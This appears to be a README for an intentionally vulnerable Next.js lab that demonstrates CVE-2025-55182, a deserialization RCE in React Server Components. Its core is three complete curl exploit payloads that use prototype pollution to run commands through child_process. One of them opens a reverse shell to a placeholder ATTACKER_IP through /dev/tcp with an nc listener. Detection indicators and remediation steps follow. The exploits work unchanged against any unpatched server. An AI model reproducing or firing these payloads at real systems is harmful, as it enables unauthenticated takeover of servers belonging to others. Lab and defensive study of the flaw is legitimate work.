# Next.js React Server Components RCE (CVE-2025-55182)

A vulnerable Next.js application demonstrating CVE-2025-55182, a critical remote code execution vulnerability in React Server Components.

## Vulnerability Details

**CVE ID:** CVE-2025-55182
**Severity:** Critical (CVSS N/A)
**Affected Versions:**

- React 19.0.0, 19.1.0, 19.1.1, 19.2.0
- Next.js applications using Server Actions

**Description:**
React Server Components contain an unsafe deserialization vulnerability in HTTP requests to Server Function endpoints. Attackers can send specially crafted multipart/form-data payloads to execute arbitrary code remotely without authentication.

## Setup

```bash
docker-compose up -d
```

The application runs on http://localhost:443

## Vulnerabilities

### 1. Remote Code Execution via Unsafe Deserialization

**Location:** Server Actions endpoint (`/`)
**Type:** Unsafe deserialization leading to RCE
**Authentication Required:** No

The vulnerability exists in how Next.js processes Server Actions. By sending a specially crafted payload with prototype pollution, attackers can execute arbitrary code on the server.

#### Exploitation

**Basic RCE (Unix/Linux):**

```bash
curl -X POST http://localhost:443/ \
  -H "Next-Action: x" \
  -H "X-Nextjs-Request-Id: test123" \
  -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad" \
  -H "X-Nextjs-Html-Request-Id: htmltest456" \
  --data-binary @- << 'EOF'
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('whoami').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?result=${res};307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
EOF
```

Check the `x-action-redirect` header in the response for the command output.

**Execute Calculator:**

```bash
curl -X POST http://localhost:443/ \
  -H "Next-Action: x" \
  -H "X-Nextjs-Request-Id: test123" \
  -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad" \
  -H "X-Nextjs-Html-Request-Id: htmltest456" \
  -i --data-binary @- << 'EOF'
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('echo $((42000*43000))').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
EOF
```

Look for `x-action-redirect: /login?a=1806000000` in the response headers.

**Reverse Shell:**

```bash
# On attacker machine, start listener:
nc -lvnp 4444

# Send exploit:
curl -X POST http://localhost:443/ \
  -H "Next-Action: x" \
  -H "X-Nextjs-Request-Id: test123" \
  -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad" \
  -H "X-Nextjs-Html-Request-Id: htmltest456" \
  --data-binary @- << 'EOF'
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"');;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: 'NEXT_REDIRECT;push;/;307;'});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
EOF
```

Replace `ATTACKER_IP` with your IP address.

#### How It Works

1. The exploit sends a malformed Server Action request with specific headers
2. The payload uses prototype pollution to inject malicious code into `_response._prefix`
3. The injected code uses `process.mainModule.require('child_process')` to execute system commands
4. The result is returned in a redirect header (`x-action-redirect`)

#### Detection

Look for:

- POST requests to `/` with `Next-Action` header
- Multipart form data with unusual JSON payloads
- References to `__proto__`, `constructor`, or `child_process` in request bodies
- Unexpected `X-Nextjs-Request-Id` and `X-Nextjs-Html-Request-Id` headers

## Remediation

1. Upgrade React to version 19.0.1 or later
2. Upgrade Next.js to patched versions (15.1.4+ or 14.2.26+)
3. Implement input validation on Server Actions
4. Use Web Application Firewall (WAF) rules to detect exploitation attempts

## References

- https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components
- https://github.com/vercel/next.js/security/advisories/GHSA-9qr9-h5gf-34mp
- https://vercel.com/changelog/cve-2025-55182
- https://www.facebook.com/security/advisories/cve-2025-55182
- https://github.com/assetnote/react2shell-scanner
